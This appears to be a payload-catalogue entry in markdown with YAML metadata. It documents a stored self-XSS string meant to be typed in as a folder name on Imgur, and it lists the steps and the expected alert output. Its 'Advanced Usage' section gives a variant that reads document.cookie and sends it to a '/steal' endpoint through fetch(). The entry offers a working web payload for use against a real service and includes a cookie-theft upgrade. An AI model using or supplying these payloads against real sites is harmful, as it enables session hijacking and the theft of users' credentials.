---
id: cmd-imgur-xss-payload
data: 1"'><img src=x onerror=prompt(1)>
tags:
  - xss
  - payload
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:57.789Z'
verified: false
validated: true
submitted: true
---
# XSS Payload Folder Name

## Command

```javascript
1"'><img src=x onerror=prompt(1)>
```

## Description

This payload is used as a folder name in Imgur to test stored self-XSS; it closes HTML attributes and injects an executable img tag.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| payload | The string to inject as folder name | Yes |

## Examples

### Basic Usage

Enter directly in folder creation UI.

### Advanced Usage

Enhance: "<img src=x onerror=fetch('/steal?'+document.cookie)>"

## Expected Output

On folder interaction (e.g., add image), alert with '1' appears, confirming execution.

## Related

- [[Related Procedure: Verify Self-XSS in Folder]]
